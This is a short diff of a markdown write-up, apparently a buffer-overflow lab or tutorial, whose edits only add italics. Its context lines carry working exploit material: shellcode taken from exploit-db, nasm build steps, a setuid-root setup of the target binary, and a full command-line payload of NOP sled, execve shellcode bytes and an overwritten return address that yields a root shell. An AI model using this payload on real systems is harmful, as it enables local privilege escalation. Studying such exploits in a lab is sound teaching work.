@@ -253,7 +253,7 @@ We got our exploit working.
 
 #### Extra bits ####
 
-Using the shellcode from https://www.exploit-db.com/exploits/41498, extract to shellcode.asm
+Using the shellcode from https://www.exploit-db.com/exploits/41498, extract to _shellcode.asm_
 
 ```
 nasm -f elf64 -o shellcode.o shellcode.asm
@@ -274,7 +274,7 @@ chmod +s vuln
 sudo chown root:root vuln
 ```
 
-We can attain root:
+We can attain _root_:
 
 ```
 ./vuln $(python -c 'print "\x90" * (524-31-30+2) + "\x31\xff\x57\x6a\x69\x58\x48\xbb\x5e\xc4\xd2\xdc\x5e\x5e\xe6\xd0\x0f\x05\x48\xd1\xcb\xb0\x3b\x53\x87\xf7\x54\x99\x5f\x0f\x05" + "\x7f\xffxff\xff\xde\xad"[::-1] * 5  ')
